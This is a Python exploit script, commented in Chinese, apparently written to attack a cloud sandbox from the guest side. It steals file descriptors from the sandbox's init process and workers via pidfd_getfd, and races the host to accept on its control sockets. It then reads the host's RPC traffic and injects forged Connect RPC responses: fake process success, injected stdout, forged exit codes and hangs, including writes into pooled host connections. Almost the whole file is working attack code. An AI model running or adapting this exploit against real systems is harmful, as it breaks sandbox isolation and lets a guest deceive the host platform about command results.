# -*- coding: utf-8 -*-
"""exp_pidfd guest 侧 v12: accept 完整捕获 + 只注入伪造 SpawnEvent 流(ok)
v12 相对 v11:
  - mode 分配 bug 修复: 只在成功 accept 后轮转; v11 的 EAGAIN 尝试消耗了 seq,
    导致 'ok'(伪造 SpawnEvent 流)从未发出(两次成功 accept 分别是 ro/err)
  - 只注入 'ok'(伪造 started+exit 流): err(500)/ro(不注入)已被 run13 证明
    host 会重试抵消, 无观察差异
  - poll 间隔 1000ms -> 200ms: 提高与 host epoll 循环的 accept 竞速胜率
    (run13 胜率仅 2/18)
"""
import ctypes, os, sys, struct, time, errno, threading

sys.stdout.reconfigure(encoding='utf-8')
OUT = '/vercel/sandbox/pidfd.out'
logf = open(OUT, 'w', encoding='utf-8')
LOCK = threading.Lock()

def log(s):
    with LOCK:
        logf.write(s + '\n')
        logf.flush()

libc = ctypes.CDLL(None, use_errno=True)

def sc(n, *args):
    r = libc.syscall(n, *args)
    e = ctypes.get_errno()
    return r, e

libc.getsockopt.restype = ctypes.c_int
libc.getsockopt.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_int,
                            ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint)]
libc.getsockname.restype = ctypes.c_int
libc.getsockname.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint)]
libc.getpeername.restype = ctypes.c_int
libc.getpeername.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint)]
libc.recv.restype = ctypes.c_ssize_t
libc.recv.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int]
libc.send.restype = ctypes.c_ssize_t
libc.send.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int]
libc.accept4.restype = ctypes.c_int
libc.accept4.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint), ctypes.c_int]

PIDFD_OPEN = 434
PIDFD_GETFD = 438
ACCEPT4 = 288
POLL = 7
SOL_SOCKET = 1
SO_DOMAIN = 39
SO_TYPE = 3
SO_PEERCRED = 17
SO_ERROR = 4
MSG_DONTWAIT = 0x40
MSG_PEEK = 0x02
MSG_TRUNC = 0x20
POLLIN = 0x001
POLLHUP = 0x010
POLLERR = 0x008
S_IFMT = 0o170000
S_IFSOCK = 0o140000
AF_UNIX = 1
SOCK_STREAM = 1
SOCK_DGRAM = 2
SOCK_SEQPACKET = 5
SOCK_NONBLOCK = 0x800
SOCK_CLOEXEC = 0x80000


class ucred(ctypes.Structure):
    _fields_ = [('pid', ctypes.c_int), ('uid', ctypes.c_int), ('gid', ctypes.c_int)]


class pollfd(ctypes.Structure):
    _fields_ = [('fd', ctypes.c_int), ('events', ctypes.c_short), ('revents', ctypes.c_short)]


def sockaddr_info(fd, which):
    """which: 'getpeername' / 'getsockname'。返回 (errno, family, addr_str)"""
    buf = ctypes.create_string_buffer(256)
    sz = ctypes.c_uint(256)
    if which == 'getpeername':
        r = libc.getpeername(fd, buf, ctypes.byref(sz))
    else:
        r = libc.getsockname(fd, buf, ctypes.byref(sz))
    e = ctypes.get_errno()
    if r < 0:
        return (e, None, None)
    fam = struct.unpack('H', buf.raw[:2])[0]
    if fam == AF_UNIX:
        if sz.value > 2:
            p = buf.raw[2:sz.value].split(b'\x00', 1)[0]
            return (0, fam, p.decode('utf-8', 'replace'))
        return (0, fam, '<anon>')
    if fam in (2, 10):  # AF_INET / AF_INET6
        return (0, fam, 'inet:' + buf.raw[:sz.value].hex())
    return (0, fam, 'fam%d' % fam)


def gso_int(fd, opt):
    v = ctypes.c_int(0)
    sz = ctypes.c_uint(4)
    r = libc.getsockopt(fd, SOL_SOCKET, opt, ctypes.byref(v), ctypes.byref(sz))
    if r < 0:
        return None
    return v.value


def gso_peercred(fd):
    uc = ucred()
    sz = ctypes.c_uint(ctypes.sizeof(uc))
    r = libc.getsockopt(fd, SOL_SOCKET, SO_PEERCRED, ctypes.byref(uc), ctypes.byref(sz))
    if r < 0:
        return None
    return (uc.pid, uc.uid, uc.gid)


def sock_err(fd):
    v = ctypes.c_int(0)
    sz = ctypes.c_uint(4)
    r = libc.getsockopt(fd, SOL_SOCKET, SO_ERROR, ctypes.byref(v), ctypes.byref(sz))
    return v.value if r == 0 else None


def recv_flags(fd, n=8192, flags=MSG_PEEK | MSG_DONTWAIT):
    buf = ctypes.create_string_buffer(n)
    r = libc.recv(fd, buf, n, flags)
    if r < 0:
        return None
    return buf.raw[:r]


def unix_table():
    """解析 /proc/net/unix: inode -> (state, path)"""
    t = {}
    try:
        with open('/proc/net/unix') as f:
            for ln in f.readlines()[1:]:
                p = ln.split()
                if len(p) < 7:
                    continue
                ino = int(p[6], 16)
                state = int(p[5], 16)
                path = p[7] if len(p) > 7 else ''
                t[ino] = (state, path)
    except OSError as e:
        log('unix_table err %s' % e)
    return t


def epoll_probe():
    """读 sandbox-init 的 epoll fdinfo(tfd 行), 揭示其注册监听哪些 fd"""
    log('=== EPOLL PROBE ===')
    try:
        fds = sorted(int(x) for x in os.listdir('/proc/1/fd'))
    except OSError:
        return
    for fd in fds:
        try:
            with open('/proc/1/fdinfo/%d' % fd) as f:
                content = f.read()
        except OSError:
            continue
        if 'tfd:' in content:
            log('--- epoll fd %d ---' % fd)
            for ln in content.splitlines():
                if ln.startswith('tfd:'):
                    log('  %s' % ln.strip())
    log('=== EPOLL PROBE done ===')


def classify(stolen, src, proc_fd=None, unix_t=None):
    tag = 'srcfd=%d' % proc_fd if proc_fd is not None else ''
    try:
        m = os.fstat(stolen).st_mode & S_IFMT
    except OSError as e:
        log('SRC=%s stolen=%d %s fstat err %s' % (src, stolen, tag, e))
        return None
    if m != S_IFSOCK:
        log('SRC=%s stolen=%d %s type=0%o' % (src, stolen, tag, m >> 12))
        return None
    dom = gso_int(stolen, SO_DOMAIN)
    typ = gso_int(stolen, SO_TYPE)
    perr = sock_err(stolen)
    pc = gso_peercred(stolen)
    pe, pfam, paddr = sockaddr_info(stolen, 'getpeername')
    se, sfam, saddr = sockaddr_info(stolen, 'getsockname')
    ino = None
    try:
        ino = os.lstat('/proc/1/fd/%d' % (proc_fd if proc_fd is not None else -1)).st_ino
    except OSError:
        pass
    ut = unix_t.get(ino) if (unix_t and ino) else None
    d = recv_flags(stolen, 8192, MSG_PEEK | MSG_DONTWAIT)
    if d is not None:
        peek = 'peek=%dB hex=%s' % (len(d), d[:200].hex()) if d else 'peek=empty'
    else:
        peek = 'peekerr:%s' % ctypes.get_errno()
    log('SRC=%s stolen=%d %s SOCK dom=%s typ=%s soerr=%s peercred=%s peer(%d,%s,%s) name(%d,%s,%s) unix=%s %s'
        % (src, stolen, tag, dom, typ, perr, pc, pe, pfam, paddr, se, sfam, saddr, ut, peek))
    return stolen


def try_accept_quick(stolen, srcfd):
    """probe 用: 仅 accept 判断 errno, 成功则立即关闭"""
    buf = ctypes.create_string_buffer(256)
    sz = ctypes.c_uint(256)
    r = libc.accept4(stolen, buf, ctypes.byref(sz), SOCK_NONBLOCK | SOCK_CLOEXEC)
    if r < 0:
        log('ACCEPT srcfd=%d -> errno %d' % (srcfd, ctypes.get_errno()))
        return None
    log('ACCEPT srcfd=%d -> new fd=%d (quick close)' % (srcfd, r))
    os.close(r)
    return r


def read_full(fd, max_wait=8):
    """完整读取: 循环 recv(DONTWAIT) 收集分片。idle 计数: 首片 3s 内须到, 后续 1s 无数据即停"""
    chunks = []
    t0 = time.time()
    idle = 0
    while time.time() - t0 < max_wait:
        d = recv_flags(fd, 16384, MSG_DONTWAIT)
        if d:
            chunks.append(d)
            idle = 0
        else:
            idle += 1
            if chunks and idle >= 20:
                break
            if not chunks and idle >= 60:
                break
            time.sleep(0.05)
    return b''.join(chunks)


def fake_response(mode, magic=None):
    """构造伪造 Connect RPC 响应
    Spawn 是 server-streaming: 响应体 = 多个 Connect 帧(1B flag + 4B BE len + message)
    mode='ok':   SpawnEvent{started:{process_id:"1"}} + SpawnEvent{exit:{code:0}}
    mode='out':  started + SpawnEvent{stdout:<magic>} + exit{0}   (内容注入)
    mode='exit7': started + SpawnEvent{exit:{code:7}}             (结果伪造)
    mode='hang': 仅 started, 不给 exit                            (挂起/DoS)
    mode='err':  500 + Grpc-Status 13"""
    if magic is None:
        magic = b'FAKEHOST-' + str(int(time.time()) % 100000000).encode() + b'\n'
    # SpawnStarted{process_id:"1"} = 0a 01 31
    # SpawnEvent{started} = 0a 03 0a 01 31          -> 5B payload
    f_started = b'\x00' + (5).to_bytes(4, 'big') + bytes.fromhex('0a030a0131')
    # SpawnEvent{exit:{code:0}} = 22 02 08 00        -> 4B payload
    f_exit0 = b'\x00' + (4).to_bytes(4, 'big') + bytes.fromhex('22020800')
    # SpawnEvent{exit:{code:7}} = 22 02 08 07
    f_exit7 = b'\x00' + (4).to_bytes(4, 'big') + bytes.fromhex('22020807')
    if mode == 'ok':
        body = f_started + f_exit0
    elif mode == 'out':
        # SpawnEvent{stdout: magic} = 12 <len> <magic>
        f_stdout = b'\x00' + (2 + len(magic)).to_bytes(4, 'big') + b'\x12' + bytes([len(magic)]) + magic
        body = f_started + f_stdout + f_exit0
    elif mode == 'exit7':
        body = f_started + f_exit7
    elif mode == 'hang':
        body = f_started
    elif mode == 'err':
        return (b"HTTP/1.1 500 Internal Server Error\r\n"
                b"Content-Type: application/connect+proto\r\n"
                b"Grpc-Status: 13\r\n"
                b"Grpc-Message: hijacked-by-guest\r\n"
                b"Content-Length: 5\r\n"
                b"\r\n"
                b"\x00\x00\x00\x00\x00")
    else:
        return None
    return (b"HTTP/1.1 200 OK\r\n"
            b"Content-Type: application/connect+proto\r\n"
            b"Content-Length: %d\r\n"
            b"\r\n" % len(body)) + body


def pick_fake(body):
    """按请求内容选择伪造变体: hostname->stdout 注入, sleep->exit7, ps->挂起, 其余默认"""
    b = body.lower()
    if b'hostname' in b:
        return 'out'
    if b'sleep' in b:
        return 'exit7'
    if b'ps aux' in b:
        return 'hang'
    return 'ok'


def try_accept_full(stolen, srcfd, mode='ro'):
    """observe 用: accept + 对端身份 + 完整读取 + [按请求内容注入伪造响应] + 观察后续 + 关闭"""
    buf = ctypes.create_string_buffer(256)
    sz = ctypes.c_uint(256)
    r = libc.accept4(stolen, buf, ctypes.byref(sz), SOCK_NONBLOCK | SOCK_CLOEXEC)
    if r < 0:
        log('ACCEPT srcfd=%d -> errno %d' % (srcfd, ctypes.get_errno()))
        return None
    pc = gso_peercred(r)
    pe, pfam, paddr = sockaddr_info(r, 'getpeername')
    se, sfam, saddr = sockaddr_info(r, 'getsockname')
    log('ACCEPT srcfd=%d -> fd=%d mode=%s peercred=%s peer(%d,%s,%s) name(%d,%s,%s)'
        % (srcfd, r, mode, pc, pe, pfam, paddr, se, sfam, saddr))
    data = read_full(r)
    log('ACCEPTED fd=%d total=%dB' % (r, len(data)))
    body = b''
    if data:
        try:
            head, _, body = data.partition(b'\r\n\r\n')
            log('HEAD: %s' % head.decode('utf-8', 'replace'))
            log('BODY(%d): hex=%s' % (len(body), body[:800].hex()))
            log('BODY ascii=%s' % body[:800].decode('utf-8', 'replace'))
        except Exception as e:
            log('parse err %s' % e)
            log('RAW hex=%s' % data[:800].hex())
    else:
        log('ACCEPTED fd=%d EMPTY (no data within 8s)' % r)
    # 按请求内容选择伪造响应变体
    if mode == 'auto':
        mode = pick_fake(body)
    resp = fake_response(mode)
    if resp:
        sbuf = ctypes.create_string_buffer(resp)
        n = libc.send(r, sbuf, len(resp), 0)
        log('SEND %s -> %d bytes errno %d' % (mode, n, ctypes.get_errno()))
        if n > 0:
            extra = read_full(r, max_wait=3)
            log('POST-SEND read=%dB%s' % (len(extra), (' hex=%s' % extra[:300].hex()) if extra else ''))
    time.sleep(2)
    os.close(r)
    return r


def collect_pid1():
    log('=== PHASE1 start mypid=%d ===' % os.getpid())
    ut = unix_table()
    log('unix sockets: %d entries' % len(ut))
    epoll_probe()
    pf, e = sc(PIDFD_OPEN, 1, 0)
    log('pidfd_open(1) -> %d errno %d' % (pf, e))
    if pf < 0:
        return [], [], {}
    ctrl = []
    pidfds = []
    try:
        fds = sorted(int(x) for x in os.listdir('/proc/1/fd'))
    except OSError as e:
        log('listdir err %s' % e)
        return [], [], {}
    log('sandbox-init fds: %s' % fds)
    for fd in fds:
        st, e2 = sc(PIDFD_GETFD, pf, fd, 0)
        if st < 0:
            log('steal fd%d errno %d' % (fd, e2))
            continue
        pid_tgt = None
        try:
            with open('/proc/1/fdinfo/%d' % fd) as f:
                for ln in f:
                    if ln.startswith('Pid:'):
                        pid_tgt = ln.split(':', 1)[1].strip()
        except OSError:
            pass
        r = classify(st, 'P1', proc_fd=fd, unix_t=ut)
        if r is not None:
            ctrl.append(r)
        if pid_tgt:
            pidfds.append((st, fd, int(pid_tgt)))
            log('pidfd target: stolen=%d srcfd=%d -> pid %s' % (st, fd, pid_tgt))
    log('=== PHASE1 done ctrl=%d pidfds=%s ===' % (len(ctrl), [p[2] for p in pidfds]))
    return ctrl, pidfds, ut


def traverse_workers(pidfds):
    log('=== PHASE2 start ===')
    for pf27, src_fd, tgt in pidfds:
        log('worker traverse pidfd(stolen=%d srcfd=%d) -> pid %d' % (pf27, src_fd, tgt))
        for fd in range(0, 512):
            r, e = sc(PIDFD_GETFD, pf27, fd, 0)
            if r < 0:
                continue
            classify(r, 'W%d' % tgt, proc_fd=fd)
        log('=== worker %d done ===' % tgt)
    log('=== PHASE2 done ===')


def probe_fds(ctrl_fds, ut):
    """对窃取 fd 做身份判定 + LISTEN accept + 已连接 recv 组合。返回 LISTEN fd 列表"""
    log('=== PROBE start ===')
    listen_fds = []
    for fd in ctrl_fds:
        log('--- probe fd %d ---' % fd)
        pe, pfam, paddr = sockaddr_info(fd, 'getpeername')
        se, sfam, saddr = sockaddr_info(fd, 'getsockname')
        log('fd%d peer(%d,%s,%s) name(%d,%s,%s)' % (fd, pe, pfam, paddr, se, sfam, saddr))
        if pe in (errno.ENOTCONN, errno.EINVAL) and se == 0:
            log('fd%d looks LISTEN -> accept' % fd)
            listen_fds.append(fd)
            try_accept_quick(fd, fd)
        else:
            for fl, fn in [(MSG_PEEK | MSG_DONTWAIT, 'PD'),
                           (MSG_PEEK | MSG_DONTWAIT | MSG_TRUNC, 'PDT'),
                           (MSG_PEEK, 'P'),
                           (MSG_DONTWAIT, 'D')]:
                d = recv_flags(fd, 8192, fl)
                if d is not None:
                    log('fd%d recv[%s]=%dB hex=%s' % (fd, fn, len(d), d[:200].hex()))
                else:
                    log('fd%d recv[%s]=err%s' % (fd, fn, ctypes.get_errno()))
                time.sleep(0.1)
    log('=== PROBE done listen=%s ===' % listen_fds)
    return listen_fds


def listen_loop(listen_fds, stop, seconds):
    """独立线程: 阻塞 poll LISTEN fd(200ms), 事件驱动 accept + 完整捕获 + 按请求内容注入伪造响应
    v12: 不再按 seq 轮转 mode(EAGAIN 消耗 seq 导致 ok 被浪费), 一律 'auto' 按内容选变体"""
    if not listen_fds:
        return
    larr = (pollfd * len(listen_fds))()
    for i, fd in enumerate(listen_fds):
        larr[i].fd = fd
        larr[i].events = POLLIN | POLLHUP | POLLERR
    t0 = time.time()
    accepted = 0
    while not stop.is_set() and time.time() - t0 < seconds:
        r, e = sc(POLL, larr, len(listen_fds), 200)
        if r > 0:
            for i in range(len(listen_fds)):
                if larr[i].revents & POLLIN:
                    newfd = try_accept_full(listen_fds[i], listen_fds[i], 'auto')
                    if newfd is not None:
                        accepted += 1
                larr[i].revents = 0
        elif r == 0:
            continue
        else:
            log('listen poll err %d' % e)
            break
    log('=== LISTEN THREAD done accepted=%d ===' % accepted)


def pool_inject(conn_fds, stop, seconds):
    """对已建立连接(host 连接池, fd 12/13/14)每 2s 直接 write 伪造 'out' 响应
    无需 accept 竞速: host 复用连接发下一个请求时, 会读到预注入的伪造响应"""
    if not conn_fds:
        return
    magic = b'POOLINJ-' + str(int(time.time()) % 100000000).encode() + b'\n'
    resp = fake_response('out', magic=magic)
    log('POOL-INJECT resp %dB magic=%r' % (len(resp), magic))
    t0 = time.time()
    n = 0
    while not stop.is_set() and time.time() - t0 < seconds:
        for fd in conn_fds:
            try:
                r = os.write(fd, resp)
                log('POOL-INJECT fd=%d -> %d bytes' % (fd, r))
            except OSError as e:
                log('POOL-INJECT fd=%d err %s' % (fd, e))
        n += 1
        for _ in range(4):
            if stop.is_set():
                break
            time.sleep(0.5)
    log('=== POOL INJECT done writes=%d ===' % n)


def observe(ctrl_fds, seconds, listen_fds=None):
    """Phase3: 监听线程抢 LISTEN accept; 连接池注入线程对已建立连接写伪造响应; 主线程观察已连接 fd"""
    log('=== PHASE3 start watch=%d fds=%s listen=%s ===' % (seconds, ctrl_fds, listen_fds))
    if listen_fds is None:
        listen_fds = []
    stop = threading.Event()
    lt = threading.Thread(target=listen_loop, args=(listen_fds, stop, seconds), daemon=True)
    lt.start()
    conn_fds = [fd for fd in ctrl_fds if fd not in listen_fds]
    pt = threading.Thread(target=pool_inject, args=(conn_fds, stop, seconds), daemon=True)
    pt.start()
    n = len(conn_fds)
    hits = 0
    t0 = time.time()
    last_ctrl = 0
    while time.time() - t0 < seconds:
        now = time.time()
        if conn_fds and now - last_ctrl >= 0.05:
            last_ctrl = now
            arr = (pollfd * n)()
            for i, fd in enumerate(conn_fds):
                arr[i].fd = fd
                arr[i].events = POLLIN | POLLHUP | POLLERR
            r, e = sc(POLL, arr, n, 0)
            if r > 0:
                for i in range(n):
                    if arr[i].revents:
                        fd = conn_fds[i]
                        d = recv_flags(fd, 8192, MSG_PEEK | MSG_DONTWAIT)
                        if d is not None:
                            hits += 1
                            log('PEEK fd%d hit#%d len=%d hex=%s' % (fd, hits, len(d), d[:512].hex()))
                            log('PEEK ascii=%s' % d[:512].decode('utf-8', 'replace'))
                        else:
                            log('PEEK fd%d rev=%d errno=%d' % (fd, arr[i].revents, ctypes.get_errno()))
                        arr[i].revents = 0
        time.sleep(0.05)
    stop.set()
    lt.join(timeout=3)
    pt.join(timeout=3)
    log('=== PHASE3 done hits=%d ===' % hits)


def main():
    log('=== exp_pidfd v13 start ===')
    try:
        ctrl, pidfds, ut = collect_pid1()
        traverse_workers(pidfds)
        listen = probe_fds(ctrl, ut)
        log('ctrl candidates: %s' % ctrl)
        log('=== ALLDONE ===')
        observe(ctrl, 130, listen_fds=listen)
    except Exception as e:
        import traceback
        log('FATAL: %r' % e)
        log(traceback.format_exc())
    log('=== EXIT ===')
    logf.close()


main()
